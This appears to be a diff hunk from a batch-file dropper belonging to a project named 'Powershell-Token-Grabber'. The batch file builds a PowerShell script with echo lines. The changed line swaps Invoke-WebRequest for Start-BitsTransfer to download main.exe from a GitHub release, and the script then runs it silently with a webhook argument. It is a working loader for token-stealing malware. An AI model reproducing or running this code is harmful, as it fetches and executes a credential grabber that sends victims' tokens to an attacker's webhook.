@@ -119,7 +119,7 @@ echo     if ($TEMP_KOT -eq $false) { >> powershell.ps1
 echo         New-Item "$env:LOCALAPPDATA\Temp\KDOT" -Type Directory >> powershell.ps1
 echo     } >> powershell.ps1
 echo     $gotta_make_sure = "penis"; Set-Content -Path "$env:LOCALAPPDATA\Temp\KDOT\bruh.txt" -Value "$gotta_make_sure" >> powershell.ps1
-echo     Invoke-WebRequest -Uri "https://github.com/KDot227/Powershell-Token-Grabber/releases/download/Fixed_version/main.exe" -OutFile "main.exe" -UseBasicParsing >> powershell.ps1
+echo     Start-BitsTransfer -Source "https://github.com/KDot227/Powershell-Token-Grabber/releases/download/Fixed_version/main.exe" -Destination "main.exe" -TransferType Download -Priority Foreground >> powershell.ps1
 echo     $proc = Start-Process $env:LOCALAPPDATA\Temp\main.exe -ArgumentList "$webhook" -NoNewWindow -PassThru >> powershell.ps1
 echo     $proc.WaitForExit() >> powershell.ps1
 echo     $lol = "$env:LOCALAPPDATA\Temp" >> powershell.ps1
